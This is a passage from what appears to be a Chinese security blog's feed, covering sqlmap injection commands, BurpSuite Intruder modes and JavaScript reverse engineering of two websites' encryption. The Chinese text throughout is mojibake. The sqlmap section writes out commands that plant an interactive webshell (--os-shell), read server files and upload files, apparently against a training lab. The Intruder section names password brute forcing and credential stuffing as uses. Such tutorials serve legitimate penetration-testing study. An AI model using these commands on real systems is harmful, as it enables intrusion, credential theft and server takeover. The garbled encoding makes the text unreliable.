id="éœ€è¦ç™»é™†çš„æ³¨å…¥">éœ€è¦ç™»é™†çš„æ³¨å…¥</h3><p>åˆ©ç”¨cookieå‚æ•°æ³¨å…¥ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æŠ“åŒ…æ³¨å…¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp; Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot;</span><br></pre></td></tr></table></figure><h3 id="äº¤äº’å¼shell">äº¤äº’å¼shell</h3><p>å†™æ–‡ä»¶çš„ä¸¤ä¸ªå‰æï¼š</p><ol><li>è·å–ç½‘ç«™çš„ç»å¯¹è·¯å¾„</li><li>æ‹¥æœ‰è¶³å¤Ÿçš„æƒé™<code>dba/root</code></li></ol><p>é¦–å…ˆåˆ¤æ–­å½“å‰æ˜¯å¦ä¸ºdbaæƒé™</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200622133450.png" alt=""></p><p>å¼€å§‹å†™å…¥shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;è·¯å¾„&quot; --os-shell</span><br></pre></td></tr></table></figure><p>é€‰æ‹©shellè„šæœ¬ç±»å‹ï¼Œæ¥ç€è¾“å…¥è·¯å¾„ï¼Œå†™å…¥æˆåŠŸå°±è¿›å…¥ä¸€ä¸ªäº¤äº’å¼çš„shellå‘½ä»¤è¡Œï¼Œè¿˜ä¼šè¿”å›ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯å†™å…¥äº†2ä¸ªshellï¼Œä¸€ä¸ªç”¨æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå¦ä¸€ä¸ªç”¨æ¥ä¸Šä¼ ï¼Œå…¶ä¸­ä¸Šä¼ shellçš„æ–‡ä»¶åä¸ºtmpugppx.phpï¼Œå‡ºç°admin adminè¿™æ ·çš„æ–‡å­—ï¼Œè¿™æ˜¯sqlmapç”¨æ¥ç¡®è®¤æ˜¯å¦æˆåŠŸå†™è¿›shellçš„æ ‡å¿—</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200622133910.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200622134053.png" alt=""></p><h3 id="æ–‡ä»¶è¯»å†™">æ–‡ä»¶è¯»å†™</h3><p>è¯»æ–‡ä»¶éœ€è¦çŸ¥é“è·¯å¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; --file-read&#x3D;&#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;php.ini</span><br></pre></td></tr></table></figure><p>å†™æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; --file-write C:\1.txt --file-dest &#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;vulnerabilities&#x2F;exec&#x2F;1.txt</span><br></pre></td></tr></table></figure><p>è¡¨ç¤ºå°†æœ¬åœ°<code>C:\\1.txt</code> å†™å…¥åˆ°æœåŠ¡å™¨ç«¯<code>/opt/lampp/htdocs/vulnerabilities/exec/1.txt</code></p><h3 id="è¾…åŠ©æ‰‹å·¥æ³¨å…¥">è¾…åŠ©æ‰‹å·¥æ³¨å…¥</h3><p>ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯æ¯æ‰§è¡Œä¸€æ¬¡éƒ½ä¼šä½¿ç”¨æ‰‹å·¥çš„è¯­å¥æ³¨å…¥ä¸€éï¼Œæ•ˆç‡æ¯”è¾ƒä½ï¼Œç¬¬äºŒç§ç±»ä¼¼äºå¹³å¸¸å‘½ä»¤è¡Œæ‰§è¡Œsqlè¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;è·¯å¾„&quot; --sql-query &quot;sqlè¯­å¥&quot;</span><br><span class="line">sqlmap.py -r &quot;è·¯å¾„&quot; --sql-shell</span><br></pre></td></tr></table></figure><h2 id="SqlMapæ£€æµ‹å‚æ•°">SqlMapæ£€æµ‹å‚æ•°</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">--current-user      æ£€ç´¢å½“å‰ç”¨æˆ·</span><br><span class="line">--current-db        æ£€ç´¢å½“å‰æ•°æ®åº“</span><br><span class="line">-is-dba å½“å‰ç”¨æˆ·æƒé™ï¼ˆæ˜¯å¦ä¸ºrootæƒé™ï¼‰</span><br><span class="line">-dbs æ‰€æœ‰æ•°æ®åº“</span><br><span class="line">--users             åˆ—å‡ºç”¨æˆ·åˆ—è¡¨</span><br><span class="line">--passwords         åˆ—å‡ºç”¨æˆ·å¯†ç çš„hashå€¼</span><br><span class="line">--os-shell          æç¤ºä¸ºäº¤äº’å¼æ“ä½œç³»ç»Ÿshell</span><br><span class="line">--os-pwn            æç¤ºä¸ºOOBå¤–å£³ï¼ŒMeterpreteræˆ–VNC</span><br><span class="line">--batch             æ°¸è¿œä¸è¦è¦æ±‚ç”¨æˆ·è¾“å…¥ï¼Œä½¿ç”¨é»˜è®¤è¡Œä¸º</span><br><span class="line">--sql-shell         æç¤ºè¾“å…¥äº¤äº’å¼sqlmap shell</span><br><span class="line">è¯·æ±‚:</span><br><span class="line">    è¿™äº›é€‰é¡¹å¯ç”¨äºæŒ‡å®šå¦‚ä½•è¿æ¥åˆ°ç›®æ ‡URL</span><br><span class="line">    --data&#x3D;DATA         æ•°æ®å­—ç¬¦ä¸²é€šè¿‡POSTå‘é€</span><br><span class="line">    --cookie&#x3D;COOKIE     HTTP Cookieçš„å€¼</span><br><span class="line">    --random-agent      éšæœºé€‰æ‹© HTTP User-Agent å¤´çš„å€¼</span><br><span class="line">    --proxy&#x3D;PROXY       ä½¿ç”¨ä»£ç†å»è¿æ¥ç›®æ ‡URL</span><br><span class="line">    --tor               ä½¿ç”¨åŒ¿åç½‘ç»œ</span><br><span class="line">    --check-tor         æ£€æŸ¥Toræ˜¯å¦æ­£ç¡®ä½¿ç”¨</span><br><span class="line"></span><br><span class="line">File system accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰ï¼š</span><br><span class="line">è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº•å±‚æ–‡ä»¶ç³»ç»Ÿã€‚</span><br><span class="line"></span><br><span class="line">    â€“file-read&#x3D;RFILE ä»åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿè¯»å–æ–‡ä»¶</span><br><span class="line">    â€“file-write&#x3D;WFILE ç¼–è¾‘åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿä¸Šçš„æœ¬åœ°æ–‡ä»¶</span><br><span class="line">    â€“file-dest&#x3D;DFILE åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå†™å…¥æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</span><br><span class="line"></span><br><span class="line">Optimizationï¼ˆä¼˜åŒ–ï¼‰ï¼š</span><br><span class="line">è¿™äº›é€‰é¡¹å¯ç”¨äºä¼˜åŒ–SqlMapçš„æ€§èƒ½ã€‚</span><br><span class="line">    -o å¼€å¯æ‰€æœ‰ä¼˜åŒ–å¼€å…³</span><br><span class="line">    â€“predict-output é¢„æµ‹å¸¸è§çš„æŸ¥è¯¢è¾“å‡º</span><br><span class="line">    â€“keep-alive ä½¿ç”¨æŒä¹…çš„HTTPï¼ˆSï¼‰è¿æ¥</span><br><span class="line">    â€“null-connection ä»æ²¡æœ‰å®é™…çš„HTTPå“åº”ä½“ä¸­æ£€ç´¢é¡µé¢é•¿åº¦</span><br><span class="line">    â€“threads&#x3D;THREADS æœ€å¤§çš„HTTPï¼ˆSï¼‰è¯·æ±‚å¹¶å‘é‡ï¼ˆé»˜è®¤ä¸º1ï¼‰</span><br><span class="line"></span><br><span class="line">Injectionï¼ˆæ³¨å…¥ï¼‰ï¼š</span><br><span class="line">è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šæµ‹è¯•å“ªäº›å‚æ•°ï¼Œ æä¾›è‡ªå®šä¹‰çš„æ³¨å…¥payloadså’Œå¯é€‰ç¯¡æ”¹è„šæœ¬ã€‚</span><br><span class="line">    -p TESTPARAMETER å¯æµ‹è¯•çš„å‚æ•°ï¼ˆSï¼‰</span><br><span class="line">    â€“dbms&#x3D;DBMS å¼ºåˆ¶åç«¯çš„DBMSä¸ºæ­¤å€¼</span><br><span class="line">    â€“os&#x3D;OS å¼ºåˆ¶åç«¯çš„DBMSæ“ä½œç³»ç»Ÿä¸ºè¿™ä¸ªå€¼</span><br><span class="line">    â€“prefix&#x3D;PREFIX æ³¨å…¥payloadå­—ç¬¦ä¸²å‰ç¼€</span><br><span class="line">    â€“suffix&#x3D;SUFFIX æ³¨å…¥payloadå­—ç¬¦ä¸²åç¼€</span><br><span class="line">    â€“tamper&#x3D;TAMPER ä½¿ç”¨ç»™å®šçš„è„šæœ¬ï¼ˆSï¼‰ç¯¡æ”¹æ³¨å…¥æ•°æ®</span><br><span class="line"></span><br><span class="line">Detectionï¼ˆæ£€æµ‹ï¼‰ï¼š</span><br><span class="line">è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šåœ¨SQLç›²æ³¨æ—¶å¦‚ä½•è§£æå’Œæ¯”è¾ƒHTTPå“åº”é¡µé¢çš„å†…å®¹ã€‚</span><br><span class="line">    â€“level&#x3D;LEVEL æ‰§è¡Œæµ‹è¯•çš„ç­‰çº§ï¼ˆ1-5ï¼Œé»˜è®¤ä¸º1ï¼‰</span><br><span class="line">    â€“risk&#x3D;RISK æ‰§è¡Œæµ‹è¯•çš„é£é™©ï¼ˆ0-3ï¼Œé»˜è®¤ä¸º1ï¼‰</span><br><span class="line">    â€“string&#x3D;STRING æŸ¥è¯¢æ—¶æœ‰æ•ˆæ—¶åœ¨é¡µé¢åŒ¹é…å­—ç¬¦ä¸²</span><br><span class="line">    â€“regexp&#x3D;REGEXP æŸ¥è¯¢æ—¶æœ‰æ•ˆæ—¶åœ¨é¡µé¢åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼</span><br><span class="line">    â€“text-only ä»…åŸºäºåœ¨æ–‡æœ¬å†…å®¹æ¯”è¾ƒç½‘é¡µ</span><br><span class="line"></span><br><span class="line">Techniquesï¼ˆæŠ€å·§ï¼‰ï¼š</span><br><span class="line">è¿™äº›é€‰é¡¹å¯ç”¨äºè°ƒæ•´å…·ä½“çš„SQLæ³¨å…¥æµ‹è¯•ã€‚</span><br><span class="line">    â€“technique&#x3D;TECH SQLæ³¨å…¥æŠ€æœ¯æµ‹è¯•ï¼ˆé»˜è®¤BEUSTï¼‰</span><br><span class="line">    â€“time-sec&#x3D;TIMESEC DBMSå“åº”çš„å»¶è¿Ÿæ—¶é—´ï¼ˆé»˜è®¤ä¸º5ç§’ï¼‰</span><br><span class="line">    â€“union-cols&#x3D;UCOLS å®šåˆ—èŒƒå›´ç”¨äºæµ‹è¯•UNIONæŸ¥è¯¢æ³¨å…¥</span><br><span class="line">    â€“union-char&#x3D;UCHAR ç”¨äºæš´åŠ›çŒœè§£åˆ—æ•°çš„å­—ç¬¦</span><br><span class="line"></span><br><span class="line">Fingerprintï¼ˆæŒ‡çº¹ï¼‰ï¼š</span><br><span class="line">    -f, â€“fingerprint æ‰§è¡Œæ£€æŸ¥å¹¿æ³›çš„DBMSç‰ˆæœ¬æŒ‡çº¹</span><br><span class="line"></span><br><span class="line">Brute forceï¼ˆè›®åŠ›ï¼‰ï¼š</span><br><span class="line">è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è¿è¡Œè›®åŠ›æ£€æŸ¥ã€‚</span><br><span class="line">    â€“common-tables æ£€æŸ¥å­˜åœ¨å…±åŒè¡¨</span><br><span class="line">    â€“common-columns æ£€æŸ¥å­˜åœ¨å…±åŒåˆ—</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SqlMapæµ‹è¯•åŸºæœ¬æµç¨‹&quot;&gt;SqlMapæµ‹è¯•åŸºæœ¬æµç¨‹&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;sqlmap -u â€œurlâ€&lt;br&gt;
sqlmap -u URL â€“dbs&lt;br&gt;
sqlmap -u URL -D database â€“tables&lt;br&gt;
sql
      
    
    </summary>
    
    
      <category term="å·¥å…·" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Sqlmap" scheme="http://yoursite.com/tags/Sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuiteâ€”â€”Intruderå››ç§æ¨¡å¼è¯¦è§£</title>
    <link href="http://yoursite.com/2020/06/17/BurpSuite%E2%80%94%E2%80%94Intruder%E5%9B%9B%E7%A7%8D%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/06/17/BurpSuite%E2%80%94%E2%80%94Intruder%E5%9B%9B%E7%A7%8D%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-06-17T14:57:52.000Z</published>
    <updated>2020-06-17T14:59:23.398Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä¸€ã€Sniperï¼ˆç‹™å‡»æ‰‹ï¼‰">ä¸€ã€Sniperï¼ˆç‹™å‡»æ‰‹ï¼‰</h2><p>Sniperæ¨¡å¼åªèƒ½ä½¿ç”¨ä¸€ç»„ payload é›†åˆï¼Œä¸€æ¬¡åªä½¿ç”¨ä¸€ä¸ª payload ä½ç½®ï¼›å‡å¦‚æ ‡è®°äº†ä¸¤ä¸ªä½ç½® â€œAâ€ å’Œ â€œBâ€ ï¼Œpayload é›†åˆå†…æœ‰â€œ1â€å’Œâ€œ2â€ä¸¤ä¸ªå€¼ï¼Œé‚£ä¹ˆå®ƒæ”»å‡»ä¼šå½¢æˆä»¥ä¸‹ç»„åˆï¼š</p><table><thead><tr><th style="text-align:center">æ”»å‡»åºåˆ—</th><th style="text-align:center">ä½ç½®A</th><th style="text-align:center">ä½ç½®B</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">ä¸æ›¿æ¢</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">2</td><td style="text-align:center">ä¸æ›¿æ¢</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">ä¸æ›¿æ¢</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">ä¸æ›¿æ¢</td><td style="text-align:center">2</td></tr></tbody></table><p>é€‚ç”¨åœºæ™¯ï¼šç«äº‰æ¡ä»¶æµ‹è¯•ï¼ˆé€‰æ‹©Null payloadsï¼‰ï¼Œå¯†ç ã€éªŒè¯ç æš´åŠ›ç ´è§£ï¼Œé‡æ”¾æ”»å‡»ç­‰åœºæ™¯</p><h2 id="äºŒã€Battering-ramï¼ˆæ”»åŸé”¤ï¼‰">äºŒã€Battering ramï¼ˆæ”»åŸé”¤ï¼‰</h2><p>åŒæ ·åªèƒ½ä½¿ç”¨ä¸€ç»„ payload é›†åˆï¼Œä¸åŒçš„åœ°æ–¹åœ¨äºæ¯æ¬¡æ”»å‡»éƒ½æ˜¯æ›¿æ¢æ‰€æœ‰payloadæ ‡è®°ä½ç½®ï¼›å¦‚æœæ·»åŠ äº†ä¸¤ä¸ªå‚æ•°çš„è¯ï¼Œå°±ä¸€èµ·è¿›è¡Œçˆ†ç ´ï¼Œä¸¤ä¸ªå‚æ•°çˆ†ç ´æ—¶å€™çš„å€¼è‚¯å®šå°±æ˜¯ä¸€æ ·çš„äº†ï¼š</p><table><thead><tr><th style="text-align:center">æ”»å‡»åºåˆ—</th><th style="text-align:center">ä½ç½®A</th><th style="text-align:center">ä½ç½®B</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">2</td><td style="text-align:center">2</td></tr></tbody></table><p>é€‚ç”¨åœºæ™¯ï¼šæš´åŠ›ç ´è§£</p><h2 id="ä¸‰ã€Pitchforkï¼ˆè‰å‰ï¼‰">ä¸‰ã€Pitchforkï¼ˆè‰å‰ï¼‰</h2><p>è‰å‰æ¨¡å¼å…è®¸ä½¿ç”¨å¤šç»„payloadç»„åˆï¼Œå¦‚æœåªæ·»åŠ äº†ä¸€ä¸ªå‚æ•°çš„è¯ï¼Œä¼šæŠ¥é”™ï¼›åœ¨æ¯ä¸ªæ ‡è®°ä½ç½®ä¸Šéå†å„è‡ªå¯¹åº”çš„payloadç»„åˆï¼Œå‡è®¾æœ‰ä¸¤ä¸ªä½ç½®â€œAâ€å’Œâ€œBâ€ï¼Œpayloadç»„åˆ1çš„å€¼ä¸ºâ€œ1â€å’Œâ€œ2â€ï¼Œpayloadç»„åˆ2çš„å€¼ä¸ºâ€œ3â€å’Œâ€œ4â€ï¼Œé‚£ä¹ˆå®ƒæ”»å‡»ä¼šå½¢æˆä»¥ä¸‹ç»„åˆï¼š</p><table><thead><tr><th style="text-align:center">æ”»å‡»åºåˆ—</th><th style="text-align:center">ä½ç½®A</th><th style="text-align:center">ä½ç½®B</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">3</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">2</td><td style="text-align:center">4</td></tr></tbody></table><p>æ³¨ï¼šå¦‚æœä¸¤ä¸ªpayloadè¡Œæ•°ä¸ä¸€è‡´çš„è¯ï¼Œå–æœ€å°å€¼è¿›è¡Œæµ‹è¯•ã€‚æ‰€ä»¥çˆ†ç ´çš„æ¬¡æ•°å–ä¸¤ä¸ªä¸­æœ€å°çš„ä¸ºå‡†ã€‚</p><p>é€‚ç”¨åœºæ™¯ï¼šæ¶æ„æ³¨å†Œã€æ’è£¤</p><h2 id="å››ã€Cluster-bombï¼ˆé›†æŸç‚¸å¼¹ï¼‰">å››ã€Cluster bombï¼ˆé›†æŸç‚¸å¼¹ï¼‰</h2><p>é›†æŸç‚¸å¼¹ä¹Ÿå…è®¸ä½¿ç”¨å¤šç»„payloadç»„åˆï¼Œè·Ÿè‰å‰æ¨¡å¼ä¸åŒçš„åœ°æ–¹åœ¨äºï¼Œé›†æŸç‚¸å¼¹æ¨¡å¼ä¼šå¯¹payloadç»„è¿›è¡Œç¬›å¡å°”ç§¯ï¼Œé‚£ä¹ˆå®ƒæ”»å‡»ä¼šå½¢æˆä»¥ä¸‹ç»„åˆï¼š</p><table><thead><tr><th style="text-align:center">æ”»å‡»åºåˆ—</th><th style="text-align:center">ä½ç½®A</th><th style="text-align:center">ä½ç½®B</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">3</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">1</td><td style="text-align:center">4</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">2</td><td style="text-align:center">3</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">2</td><td style="text-align:center">4</td></tr></tbody></table><p>é€‚ç”¨åœºæ™¯ï¼šè´¦å·ã€å¯†ç æš´åŠ›ç ´è§£</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ä¸€ã€Sniperï¼ˆç‹™å‡»æ‰‹ï¼‰&quot;&gt;ä¸€ã€Sniperï¼ˆç‹™å‡»æ‰‹ï¼‰&lt;/h2&gt;
&lt;p&gt;Sniperæ¨¡å¼åªèƒ½ä½¿ç”¨ä¸€ç»„ payload é›†åˆï¼Œä¸€æ¬¡åªä½¿ç”¨ä¸€ä¸ª payload ä½ç½®ï¼›å‡å¦‚æ ‡è®°äº†ä¸¤ä¸ªä½ç½® â€œAâ€ å’Œ â€œBâ€ ï¼Œpayload é›†åˆå†…æœ‰â€œ1â€å’Œâ€œ2â€ä¸¤ä¸ªå€¼ï¼Œé‚£ä¹ˆå®ƒæ”»å‡»ä¼š
      
    
    </summary>
    
    
      <category term="å·¥å…·" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="BurpSuite" scheme="http://yoursite.com/tags/BurpSuite/"/>
    
  </entry>
  
  <entry>
    <title>JSé€†å‘ç³»åˆ—ä¸€</title>
    <link href="http://yoursite.com/2020/06/17/JS%E9%80%86%E5%90%91%E4%B8%80/"/>
    <id>http://yoursite.com/2020/06/17/JS%E9%80%86%E5%90%91%E4%B8%80/</id>
    <published>2020-06-17T10:16:58.000Z</published>
    <updated>2020-06-17T10:30:14.032Z</updated>
    
    <content type="html"><![CDATA[<h3 id="è°·æ­Œå­¦æœ¯é•œåƒ">è°·æ­Œå­¦æœ¯é•œåƒ</h3><p>ç›®æ ‡ç½‘å€ï¼š<a href="https://ac.scmor.com/" target="_blank" rel="noopener">https://ac.scmor.com/</a></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531174729.png" alt=""></p><p>ç›®çš„æ˜¯çˆ¬å–å­¦æœ¯é•œåƒçš„çœŸå®åœ°å€ï¼Œåœ¨Elementsè§†å›¾ä¸‹ï¼Œè§‚å¯Ÿ<code>ç°åœ¨è®¿é—®</code>aæ ‡ç­¾ï¼Œå‘ç°å¯ç”¨äº†onclickäº‹ä»¶ï¼Œè°ƒç”¨äº†<code>visit()</code>å‡½æ•°ï¼Œå‡½æ•°å†…çš„å†…å®¹ï¼ŒçŒœæµ‹å°±æ˜¯åŠ å¯†åçš„çœŸå®URLåœ°å€ã€‚</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531174922.png" alt=""></p><p>å…¨å±€æœç´¢<code>visit</code>,åœ¨ <a href="https://ac.scmor.com/res/?f=run&amp;v=1590682984" target="_blank" rel="noopener">https://ac.scmor.com/res/?f=run&amp;v=1590682984</a> ä¸­ï¼Œæ‰¾åˆ°äº†<code>visit</code>å‡½æ•°</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531175244.png" alt=""></p><p>ç»è¿‡è§‚å¯Ÿï¼ŒçŒœæµ‹<code>strdecode</code>æ˜¯è§£å¯†å‡½æ•°ï¼Œå°±åœ¨ä¸Šå‡ è¡Œçš„ä½ç½®ï¼Œæœ‰ä¸ªå¯ç–‘å‚æ•°<code>autour[b]</code>ï¼ŒçŒœæµ‹æ˜¯URLåœ°å€ï¼Œåœ¨Consoleä¸­æµ‹è¯•ä¸€ä¸‹</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531180634.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531180730.png" alt=""></p><p>ç»æµ‹è¯•ï¼Œ<code>autour</code>æ˜¯ä¸ªæ•°ç»„ï¼Œé‡Œé¢å­˜æ”¾äº†åŠ å¯†åçš„çœŸå®åœ°å€ï¼Œ<code>strdecode</code>ä¹Ÿçš„ç¡®æ˜¯è§£å¯†å‡½æ•°ï¼Œç°åœ¨å»æ‹‰å–<code>strdecode</code>å‡½æ•°å…·ä½“å†…å®¹<br>å…¨å±€æœç´¢ï¼Œæ‰¾åˆ°äº†<code>strdecode</code>ï¼Œç»è¿‡åˆæ­¥è§‚å¯Ÿï¼Œæ˜¯Base64åŠ å¯†ï¼Œç„¶åç¼ºå•¥è¡¥å•¥ï¼Œå°†åŠ å¯†å‡½æ•°å®Œæ•´çš„æå–å‡ºæ¥</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531181249.png" alt=""></p><p>åˆ°æ­¤ï¼ŒåŠ å¯†å‡½æ•°ä¹Ÿæœ‰äº†ï¼Œç°åœ¨éœ€è¦æ”¶é›†å…¨éƒ¨çš„URLï¼Œäºæ˜¯ï¼Œä¹‹å‰çš„<code>autour</code>æ•°ç»„ï¼Œä¹Ÿæ‹‰ä¸‹æ¥ï¼Œç°åœ¨åªéœ€è¦éå†ä¸€ä¸‹å°±å¥½äº†ï¼Œåˆšå¥½æœ‰ä¸ª<code>run</code>å‡½æ•°å°±æ˜¯Forå¾ªç¯éå†<code>autour</code>æ•°ç»„ï¼Œä¹Ÿæ‹¿ä¸‹æ¥</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531181940.png" alt=""></p><p>ç¨å¾®ä¿®æ”¹ä¸‹ç»†èŠ‚ï¼Œå°±å¤§åŠŸå‘Šæˆï¼Œæ•ˆæœå›¾å¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531182151.png" alt=""></p><h3 id="DNS-COM"><a href="http://DNS.COM" target="_blank" rel="noopener">DNS.COM</a></h3><p>ç›®æ ‡ç½‘å€ï¼š<a href="https://www.dns.com/login.html" target="_blank" rel="noopener">https://www.dns.com/login.html</a></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601011619.png" alt=""></p><p>éšä¾¿è¾“å…¥å¸å·å¯†ç è¿›è¡Œæµ‹è¯•ï¼Œå‘ç°æœ‰ä¸ªXHRè¯·æ±‚ï¼Œé‡Œé¢çš„<code>password</code>ï¼Œ<code>email</code>ä¸¤ä¸ªè¯·æ±‚å‚æ•°éƒ½åšäº†åŠ å¯†ï¼ŒçŒœæµ‹è¿™å°±æ˜¯åˆšæ‰è¾“å…¥çš„å¸å·å¯†ç </p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601011947.png" alt=""></p><p>å…¨å±€æœç´¢ <code>password</code>,é€šè¿‡åœ¨åé¢åŠ ä¸Š : æˆ–è€… = å¯ä»¥ç¼©å°èŒƒå›´ï¼Œæ’é™¤å¤šä½™é¡¹ï¼Œæ‰¾åˆ°äº†<code>password:</code>çš„ä½ç½®ï¼Œç°åœ¨å…¶å®å·²ç»å¾ˆæ˜æ˜¾æ˜¯AESåŠ å¯†äº†ï¼Œä½†è¿˜æ˜¯æµ‹è¯•ä¸€ä¸‹å§</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601012327.png" alt=""></p><p>æ‰“æ–­ç‚¹ï¼Œé‡æ–°ç™»é™†ï¼Œæœç„¶è¿›å…¥debuggerçŠ¶æ€äº†ã€‚</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601012821.png" alt=""></p><p>ç„¶ååœ¨consoleä¸­æµ‹è¯•ä¸‹<code>aes()</code>å‡½æ•°ä»¥åŠå®ƒçš„å‚æ•°åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œç»éªŒè¯ï¼Œå‘ç°<code>aes()</code>æ­£æ˜¯ä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼ŒåŠ å¯†åçš„å†…å®¹å’Œä¸€å¼€å§‹çœ‹åˆ°çš„ç›¸å»åˆ</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601013000.png" 